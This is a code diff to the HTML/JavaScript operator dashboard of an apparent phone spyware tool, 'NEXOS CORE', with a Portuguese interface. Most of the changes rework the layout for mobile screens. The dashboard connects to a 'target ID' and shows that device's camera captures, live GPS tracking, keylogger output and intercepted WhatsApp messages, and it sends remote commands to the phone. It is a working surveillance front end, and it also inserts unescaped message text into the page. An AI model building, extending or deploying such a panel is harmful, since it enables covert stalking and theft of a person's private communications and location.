@@ -19,30 +19,24 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         :root {
-            --bg: #0d1117;
-            --bg-card: #161b22;
-            --border: #30363d;
-            --text: #c9d1d9;
-            --text-dim: #8b949e;
-            --accent: #58a6ff;
-            --green: #3fb950;
-            --orange: #d2991d;
-            --red: #f85149;
-            --font: 'Segoe UI', 'Courier New', monospace;
+            --bg: #0d1117; --bg-card: #161b22; --border: #30363d;
+            --text: #c9d1d9; --text-dim: #8b949e; --accent: #58a6ff;
+            --green: #3fb950; --orange: #d2991d; --red: #f85149;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: #0d1117; color: var(--text); font-family: var(--font); font-size: 13px; display: flex; min-height: 100vh; }
+        body { background: #0d1117; color: var(--text); font-family: 'Segoe UI', 'Courier New', monospace; font-size: 13px; }
         
-        /* MENU LATERAL */
+        /* MENU LATERAL - PC */
         .sidebar {
-            width: 220px; background: #161b22; border-right: 1px solid #30363d;
-            padding: 15px 0; display: flex; flex-direction: column; flex-shrink: 0;
+            position: fixed; left: 0; top: 0; bottom: 0; width: 220px;
+            background: #161b22; border-right: 1px solid #30363d; z-index: 100;
+            display: flex; flex-direction: column; overflow-y: auto;
         }
         .sidebar-logo {
-            padding: 10px 15px 20px; font-size: 16px; font-weight: bold; color: #58a6ff;
-            border-bottom: 1px solid #30363d; margin-bottom: 10px; letter-spacing: 2px;
+            padding: 15px; font-size: 16px; font-weight: bold; color: #58a6ff;
+            border-bottom: 1px solid #30363d; letter-spacing: 2px; text-align: center;
         }
-        .sidebar-nav { display: flex; flex-direction: column; }
+        .sidebar-nav { display: flex; flex-direction: column; padding: 10px 0; }
         .sidebar-nav a {
             color: #8b949e; text-decoration: none; padding: 10px 15px; font-size: 12px;
             border-left: 3px solid transparent; transition: all 0.2s;
@@ -50,10 +44,20 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .sidebar-nav a:hover, .sidebar-nav a.active {
             color: #c9d1d9; background: #1c2128; border-left-color: #58a6ff;
         }
-        .sidebar-nav a .icon { margin-right: 8px; }
         
         /* MAIN */
-        .main-content { flex: 1; padding: 15px; overflow-y: auto; }
+        .main-content { margin-left: 220px; padding: 15px; min-height: 100vh; }
+        
+        /* TOP BAR MOBILE */
+        .mobile-topbar {
+            display: none; background: #161b22; border-bottom: 1px solid #30363d;
+            padding: 10px 15px; align-items: center; justify-content: space-between;
+        }
+        .mobile-topbar .logo { font-size: 14px; font-weight: bold; color: #58a6ff; }
+        .mobile-topbar .menu-btn {
+            background: none; border: 1px solid #30363d; color: #c9d1d9;
+            padding: 6px 12px; border-radius: 4px; font-size: 18px; cursor: pointer;
+        }
         
         /* HEADER */
         .topbar {
@@ -61,37 +65,23 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
             padding: 10px 0; border-bottom: 1px solid #30363d; margin-bottom: 15px;
         }
         .topbar h1 { font-size: 18px; color: #58a6ff; letter-spacing: 1px; }
-        .topbar .btn-sair {
-            background: #d2991d; color: #000; border: none; padding: 8px 16px;
-            border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 12px;
-        }
         
-        /* GRID CARDS */
-        .cards-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px;
-        }
-        @media(max-width: 768px) { .cards-grid { grid-template-columns: 1fr; } .sidebar { display: none; } }
+        /* GRID */
+        .cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
         
-        .card {
-            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
-            overflow: hidden;
-        }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
         .card-header {
             background: #1c2128; padding: 10px 12px; font-size: 11px; font-weight: bold;
-            color: #58a6ff; text-transform: uppercase; border-bottom: 1px solid #30363d;
-            letter-spacing: 1px;
+            color: #58a6ff; text-transform: uppercase; border-bottom: 1px solid #30363d; letter-spacing: 1px;
         }
         .card-body { padding: 0; }
         
-        /* CÂMERA */
         .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .cam-placeholder { color: #484f58; font-size: 12px; text-transform: uppercase; }
         
-        /* MAPA */
         .map-container { width: 100%; height: 300px; }
         
-        /* MENSAGENS */
         .msg-list { padding: 8px; max-height: 250px; overflow-y: auto; }
         .msg-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid #21262d; cursor: pointer; }
         .msg-item:hover { background: #1c2128; }
@@ -102,21 +92,19 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .msg-detalhe { display: none; padding: 8px 0 0 40px; font-size: 11px; color: #c9d1d9; }
         .msg-item.aberto .msg-detalhe { display: block; }
         
-        /* STATUS BAR */
         .status-bar {
             background: #161b22; border: 1px solid #30363d; border-radius: 8px;
-            padding: 10px 15px; display: flex; gap: 20px; flex-wrap: wrap;
+            padding: 10px 15px; display: flex; gap: 15px; flex-wrap: wrap;
             font-size: 11px; color: #8b949e; margin-bottom: 15px;
         }
         .status-bar span { color: #c9d1d9; font-weight: bold; }
-        .status-bar .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .dot.online { background: #3fb950; box-shadow: 0 0 6px #3fb950; }
         
-        /* BOTÕES */
         .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
         .btn {
             padding: 10px 16px; border-radius: 6px; font-size: 12px; font-weight: bold;
-            cursor: pointer; border: none; text-transform: uppercase; letter-spacing: 1px;
+            cursor: pointer; border: none; text-transform: uppercase; letter-spacing: 1px; flex: 1; min-width: 60px;
         }
         .btn-primary { background: #238636; color: #fff; }
         .btn-accent { background: #1f6feb; color: #fff; }
@@ -129,13 +117,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .keylog-bar.ativo { border-color: #3fb950; }
         .keylog-bar .app-tag { color: #d2991d; font-weight: bold; text-transform: uppercase; }
         
-        .dist-box {
-            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
-            padding: 10px 15px; text-align: center; margin-bottom: 15px;
-        }
-        .dist-box .valor { font-size: 20px; color: #58a6ff; font-weight: bold; }
-        .dist-box .label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
-        
         .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
         .info-card { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; text-align: center; }
         .info-card .valor { font-size: 18px; font-weight: bold; color: #c9d1d9; }
@@ -146,30 +127,47 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .search-box button { background: #238636; color: #fff; font-weight: bold; border: none; padding: 10px 25px; border-radius: 6px; cursor: pointer; font-size: 12px; text-transform: uppercase; }
         
         .error-box { background: #490202; border: 1px solid #f85149; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 15px; color: #f85149; }
+        
+        /* MOBILE */
+        @media(max-width: 768px) {
+            .sidebar { display: none; }
+            .sidebar.open { display: flex; position: fixed; z-index: 200; width: 250px; box-shadow: 4px 0 20px rgba(0,0,0,0.5); }
+            .main-content { margin-left: 0; }
+            .mobile-topbar { display: flex; }
+            .cards-grid { grid-template-columns: 1fr; }
+            .topbar { display: none; }
+            .btn { font-size: 11px; padding: 8px 10px; }
+            .status-bar { font-size: 10px; gap: 8px; }
+        }
     </style>
 </head>
 <body>
     <!-- MENU LATERAL -->
-    <div class="sidebar">
+    <div class="sidebar" id="sidebar">
         <div class="sidebar-logo">⚡ NEXOS CORE</div>
         <nav class="sidebar-nav">
-            <a href="#" class="active"><span class="icon">📊</span> Painel Geral</a>
-            <a href="#"><span class="icon">📸</span> Câmeras</a>
-            <a href="#"><span class="icon">📍</span> Localização GPS</a>
-            <a href="#"><span class="icon">💬</span> Mensagens</a>
-            <a href="#"><span class="icon">📞</span> Chamadas</a>
-            <a href="#"><span class="icon">🌐</span> Navegador</a>
-            <a href="#"><span class="icon">📁</span> Arquivos</a>
-            <a href="#"><span class="icon">📱</span> Aplicativos</a>
-            <a href="#"><span class="icon">🎤</span> Gravação</a>
+            <a href="#" class="active" onclick="fecharMenu()">📊 Painel Geral</a>
+            <a href="#" onclick="fecharMenu()">📸 Câmeras</a>
+            <a href="#" onclick="fecharMenu()">📍 Localização GPS</a>
+            <a href="#" onclick="fecharMenu()">💬 Mensagens</a>
+            <a href="#" onclick="fecharMenu()">📞 Chamadas</a>
+            <a href="#" onclick="fecharMenu()">🌐 Navegador</a>
+            <a href="#" onclick="fecharMenu()">📁 Arquivos</a>
+            <a href="#" onclick="fecharMenu()">📱 Aplicativos</a>
+            <a href="#" onclick="fecharMenu()">🎤 Gravação</a>
         </nav>
     </div>
     
-    <!-- CONTEÚDO PRINCIPAL -->
+    <!-- MAIN -->
     <div class="main-content">
-        <div class="topbar">
-            <h1>⚡ NEXOS // PAINEL DE CONTROLE</h1>
+        <!-- TOPBAR MOBILE -->
+        <div class="mobile-topbar">
+            <span class="logo">⚡ NEXOS</span>
+            <button class="menu-btn" onclick="toggleMenu()">☰</button>
         </div>
+        
+        <!-- TOPBAR PC -->
+        <div class="topbar"><h1>⚡ NEXOS // PAINEL DE CONTROLE</h1></div>
         
         <div class="search-box">
             <p style="color:#8b949e;margin-bottom:8px;">DIGITE O TARGET ID PARA CONECTAR</p>
@@ -182,157 +180,91 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         {% if erro %}<div class="error-box"><p>⚠️ {{ erro }}</p></div>{% endif %}
         
         {% if info_moto %}
-            <!-- STATUS BAR -->
             <div class="status-bar">
                 <span>🟢 ONLINE</span> |
-                Última atualização: <span id="txt_uptime">{{ info_moto.get('uptime', '--') }}</span> |
-                🔋 Bateria: <span id="txt_bateria">{{ info_moto.battery }}%</span> |
-                📶 Conexão: <span id="txt_network">{{ info_moto.get('network', '--') }}</span> |
-                🛣️ Distância: <span id="distanciaTotal">0.00</span> km
+                Ativo: <span id="txt_uptime">{{ info_moto.get('uptime', '--') }}</span> |
+                🔋 <span id="txt_bateria">{{ info_moto.battery }}%</span> |
+                📶 <span id="txt_network">{{ info_moto.get('network', '--') }}</span> |
+                🛣️ <span id="distanciaTotal">0.00</span> km
             </div>
             
-            <!-- INFO RÁPIDA -->
             <div class="info-grid">
                 <div class="info-card"><div class="label">🔋 Bateria</div><div class="valor" id="info_bateria" style="color:#3fb950;">{{ info_moto.battery }}%</div></div>
                 <div class="info-card"><div class="label">🛣️ Distância</div><div class="valor" id="info_distancia" style="color:#58a6ff;">0 km</div></div>
             </div>
             
-            <!-- CÂMERAS -->
             <div class="cards-grid">
-                <div class="card">
-                    <div class="card-header">🎥 Câmera Frontal - Em Tempo Real</div>
-                    <div class="card-body">
-                        <div class="cam-frame">
-                            <span id="labelFront" class="cam-placeholder">Sem Sinal</span>
-                            <img id="imgFront" src="" alt="Frontal">
-                        </div>
-                    </div>
-                </div>
-                <div class="card">
-                    <div class="card-header">🎥 Câmera Traseira - Em Tempo Real</div>
-                    <div class="card-body">
-                        <div class="cam-frame">
-                            <span id="labelBack" class="cam-placeholder">Sem Sinal</span>
-                            <img id="imgBack" src="" alt="Traseira">
-                        </div>
-                    </div>
-                </div>
+                <div class="card"><div class="card-header">🎥 Câmera Frontal</div><div class="card-body"><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div></div>
+                <div class="card"><div class="card-header">🎥 Câmera Traseira</div><div class="card-body"><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div></div>
             </div>
             
-            <!-- BOTÕES -->
             <div class="btn-row">
                 <button class="btn btn-primary" onclick="dispararCapturaDupla()">📸 Capturar</button>
-                <button class="btn btn-accent" onclick="enviarComando('vibrar')">📳 Vibrar</button>
-                <button class="btn btn-accent" onclick="enviarComando('som')">🔊 Som</button>
-                <button class="btn btn-accent" onclick="enviarComando('lanterna')">💡 Lanterna</button>
-                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn btn-accent" style="text-decoration:none;">🗺️ Google Maps</a>
+                <button class="btn btn-accent" onclick="enviarComando('vibrar')">📳</button>
+                <button class="btn btn-accent" onclick="enviarComando('som')">🔊</button>
+                <button class="btn btn-accent" onclick="enviarComando('lanterna')">💡</button>
+                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn btn-accent" style="text-decoration:none;">🗺️</a>
             </div>
             
-            <!-- MAPA -->
-            <div class="card" style="margin-bottom:15px;">
-                <div class="card-header">📍 Localização GPS Recente</div>
-                <div class="card-body"><div id="map_private" class="map-container"></div></div>
-            </div>
+            <div class="card" style="margin-bottom:15px;"><div class="card-header">📍 Localização GPS</div><div class="card-body"><div id="map_private" class="map-container"></div></div></div>
             
-            <!-- KEYLOGGER -->
             <div id="keylogBox" class="keylog-bar"><p>⌨️ Nenhum app monitorado aberto</p></div>
             
-            <!-- MENSAGENS -->
-            <div class="card" style="margin-bottom:15px;">
-                <div class="card-header">💬 Últimas Mensagens</div>
-                <div class="card-body"><div id="chatList" class="msg-list"><p style="color:#484f58;">Nenhuma mensagem recente</p></div></div>
-            </div>
+            <div class="card" style="margin-bottom:15px;"><div class="card-header">💬 Últimas Mensagens</div><div class="card-body"><div id="chatList" class="msg-list"><p style="color:#484f58;">Nenhuma mensagem recente</p></div></div></div>
             
             <script>
+                function toggleMenu() { document.getElementById('sidebar').classList.toggle('open'); }
+                function fecharMenu() { document.getElementById('sidebar').classList.remove('open'); }
+                
                 let map = L.map('map_private', { zoomControl: true }).setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {attribution: '© OpenStreetMap'}).addTo(map);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                 let marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
                 let historico = L.polyline([], {color: '#58a6ff', weight: 3}).addTo(map);
                 let pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
                 let chatsAbertos = {};
                 
                 function enviarComando(acao) {
-                    fetch('/api/comando_remoto/{{ id_buscado }}', {
-                        method: 'POST', body: JSON.stringify({acao: acao}),
-                        headers: {'Content-Type': 'application/json'}
-                    });
+                    fetch('/api/comando_remoto/{{ id_buscado }}', {method:'POST',body:JSON.stringify({acao}),headers:{'Content-Type':'application/json'}});
                 }
-                
                 function toggleMsg(id, el) {
                     if(el.classList.contains('aberto')) { el.classList.remove('aberto'); delete chatsAbertos[id]; }
                     else { el.classList.add('aberto'); chatsAbertos[id] = true; }
                 }
-                
                 async function dispararCapturaDupla() {
-                    const btn = event.target;
-                    btn.innerText = "⏳ Sincronizando..."; btn.disabled = true;
+                    const btn = event.target; btn.innerText = "⏳"; btn.disabled = true;
                     try {
-                        await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take_dual'}), headers: {'Content-Type': 'application/json'} });
-                        let t = 0;
-                        let c = setInterval(async () => {
-                            try {
-                                const r = await fetch('/api/get_camera/{{ id_buscado }}');
-                                if (r.ok) {
-                                    const d = await r.json();
-                                    if(d.photo_back) { document.getElementById('labelBack').style.display = "none"; document.getElementById('imgBack').src = "data:image/jpeg;base64," + d.photo_back; document.getElementById('imgBack').style.display = "block"; }
-                                    if(d.photo_front) { document.getElementById('labelFront').style.display = "none"; document.getElementById('imgFront').src = "data:image/jpeg;base64," + d.photo_front; document.getElementById('imgFront').style.display = "block"; }
-                                    if(d.pronto) { clearInterval(c); btn.innerText = "📸 Capturar"; btn.disabled = false; }
-                                }
-                                t++; if(t > 40) { clearInterval(c); btn.innerText = "📸 Capturar"; btn.disabled = false; }
-                            } catch(e){}
-                        }, 1500);
-                    } catch(e) { btn.innerText = "📸 Capturar"; btn.disabled = false; }
+                        await fetch('/api/comando_camera/{{ id_buscado }}', {method:'POST',body:JSON.stringify({acao:'take_dual'}),headers:{'Content-Type':'application/json'}});
+                        let t=0,c=setInterval(async()=>{
+                            try{
+                                const r=await fetch('/api/get_camera/{{ id_buscado }}');
+                                if(r.ok){const d=await r.json();
+                                    if(d.photo_back){document.getElementById('labelBack').style.display='none';document.getElementById('imgBack').src='data:image/jpeg;base64,'+d.photo_back;document.getElementById('imgBack').style.display='block';}
+                                    if(d.photo_front){document.getElementById('labelFront').style.display='none';document.getElementById('imgFront').src='data:image/jpeg;base64,'+d.photo_front;document.getElementById('imgFront').style.display='block';}
+                                    if(d.pronto){clearInterval(c);btn.innerText='📸 Capturar';btn.disabled=false;}
+                                }t++;if(t>40){clearInterval(c);btn.innerText='📸 Capturar';btn.disabled=false;}
+                            }catch(e){}
+                        },1500);
+                    }catch(e){btn.innerText='📸 Capturar';btn.disabled=false;}
                 }
-                
-                setInterval(async () => {
-                    try {
-                        const r = await fetch('/api/status/' + '{{ id_buscado }}');
-                        if (r.ok) {
-                            const d = await r.json();
-                            document.getElementById('txt_bateria').innerText = d.battery + '%';
-                            document.getElementById('info_bateria').innerText = d.battery + '%';
-                            document.getElementById('txt_uptime').innerText = d.uptime || '--';
-                            document.getElementById('txt_network').innerText = d.network || '--';
-                            document.getElementById('distanciaTotal').innerText = (d.distancia_total || 0).toFixed(2);
-                            document.getElementById('info_distancia').innerText = (d.distancia_total || 0).toFixed(2) + ' km';
-                            
-                            let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
-                            if (lat && lon) {
-                                marker.setLatLng([lat, lon]); map.panTo([lat, lon]);
-                                document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                                pontos.push([lat, lon]); historico.setLatLngs(pontos);
-                            }
-                            
-                            // KEYLOGGER
-                            let kb = document.getElementById('keylogBox');
-                            if(d.keylog && d.keylog.ativo) {
-                                kb.className = 'keylog-bar ativo';
-                                kb.innerHTML = `<p>⌨️ <span class="app-tag">${d.keylog.app}</span> monitorado${d.keylog.texto ? ' - '+d.keylog.texto.substring(0,80) : ''}</p>`;
-                            } else { kb.className = 'keylog-bar'; kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>'; }
-                            
-                            // MENSAGENS
-                            if(d.whatsapp && d.whatsapp.length > 0) {
-                                let html = '';
-                                d.whatsapp.forEach(chat => {
-                                    let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
-                                    html += `<div class="msg-item${aberto}" onclick="toggleMsg('${chat.pessoa}', this)">
-                                        <div class="msg-avatar">👤</div>
-                                        <div class="msg-info">
-                                            <div class="msg-nome">${chat.pessoa} <span style="font-size:10px;color:#8b949e;">(${chat.total})</span></div>
-                                            <div class="msg-texto">${chat.midia ? '📎 ' : ''}${chat.ultima_msg || ''}</div>
-                                            <div class="msg-detalhe">`;
-                                    if(chat.mensagens) {
-                                        chat.mensagens.slice().reverse().forEach(msg => {
-                                            html += `<div style="padding:3px 0;border-bottom:1px solid #21262d;">📥 ${msg.texto} <span style="color:#484f58;font-size:9px;">${msg.hora}</span></div>`;
-                                        });
-                                    }
-                                    html += `</div></div></div>`;
-                                });
-                                document.getElementById('chatList').innerHTML = html;
-                            }
+                setInterval(async()=>{
+                    try{
+                        const r=await fetch('/api/status/'+'{{ id_buscado }}');
+                        if(r.ok){const d=await r.json();
+                            document.getElementById('txt_bateria').innerText=d.battery+'%';
+                            document.getElementById('info_bateria').innerText=d.battery+'%';
+                            document.getElementById('txt_uptime').innerText=d.uptime||'--';
+                            document.getElementById('txt_network').innerText=d.network||'--';
+                            document.getElementById('distanciaTotal').innerText=(d.distancia_total||0).toFixed(2);
+                            document.getElementById('info_distancia').innerText=(d.distancia_total||0).toFixed(2)+' km';
+                            let lat=parseFloat(d.lat),lon=parseFloat(d.lon);
+                            if(lat&&lon){marker.setLatLng([lat,lon]);map.panTo([lat,lon]);document.getElementById('lnk_maps').href='https://www.google.com/maps?q='+lat+','+lon;pontos.push([lat,lon]);historico.setLatLngs(pontos);}
+                            let kb=document.getElementById('keylogBox');
+                            if(d.keylog&&d.keylog.ativo){kb.className='keylog-bar ativo';kb.innerHTML='<p>⌨️ <span class="app-tag">'+d.keylog.app+'</span> monitorado'+(d.keylog.texto?' - '+d.keylog.texto.substring(0,80):'')+'</p>';}
+                            else{kb.className='keylog-bar';kb.innerHTML='<p>⌨️ Nenhum app monitorado aberto</p>';}
+                            if(d.whatsapp&&d.whatsapp.length>0){let html='';d.whatsapp.forEach(chat=>{let aberto=chatsAbertos[chat.pessoa]?' aberto':'';html+='<div class="msg-item'+aberto+'" onclick="toggleMsg(\''+chat.pessoa+'\',this)"><div class="msg-avatar">👤</div><div class="msg-info"><div class="msg-nome">'+chat.pessoa+' <span style="font-size:10px;color:#8b949e;">('+chat.total+')</span></div><div class="msg-texto">'+(chat.midia?'📎 ':'')+(chat.ultima_msg||'')+'</div><div class="msg-detalhe">';if(chat.mensagens){chat.mensagens.slice().reverse().forEach(msg=>{html+='<div style="padding:3px 0;border-bottom:1px solid #21262d;">📥 '+msg.texto+' <span style="color:#484f58;font-size:9px;">'+msg.hora+'</span></div>';});}html+='</div></div></div>';});document.getElementById('chatList').innerHTML=html;}
                         }
-                    } catch(e) {}
-                }, 3000);
+                    }catch(e){}
+                },3000);
             </script>
         {% endif %}
     </div>
